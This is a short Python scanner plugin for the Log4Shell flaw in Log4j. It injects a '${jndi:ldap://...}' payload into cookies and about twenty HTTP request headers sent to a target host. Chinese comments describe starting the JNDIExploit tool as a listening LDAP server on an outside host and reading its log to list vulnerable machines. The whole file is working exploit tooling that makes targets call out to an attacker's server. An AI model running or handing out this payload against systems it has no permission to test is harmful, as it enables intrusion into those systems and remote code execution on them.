import sys
import requests


def log4shell(host):
    default_headers = [
        "Accept",
        "Accept-Encoding",
        "Accept-Language",
        "Authentication",
        "Authorization",
        "Basic",
        "Cache-Control",
        "Content-Type",
        "Date",
        "Forwarded-For-Ip",
        "If-Modified-Since",
        "Origin",
        "Referer",
        "Token",
        "User-Agent",
        "X-Api-Version",
        "X-Csrf-Token",
        "X-Forwarded-For",
    ]
    # 如果远程ldap服务收到请求，则存在漏洞，可以根据远程ldap服务输出信息判断漏洞详情
    # 例如服务器用`nohup java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 0.0.0.0 -l 1534 -p 7679 &`开启LDAP
    # 则扫描完称后可以通过`cat nohup.out | awk '{print $5}'|sort -n|uniq -c`查看存在漏洞主机
    jndi = "${jndi:ldap://[ldap-server]:1534/" + str(host) + "}"

    if "[ldap-server]" in jndi:
        print("ERROR | ldap-server not set")
        sys.exit()

    headers = {
        "Cookie": "{jndi}={jndi};JSESSIONID={jndi};SESSIONID={jndi};PHPSESSID={jndi};token={jndi};session={jndi}".format(jndi=jndi)
    }
    for h in default_headers:
        headers.update({h: jndi})
    
    requests.get(host, headers=headers)

    return "finished"


def run(host, **kwargs):
    ret = log4shell(host)
    return ret
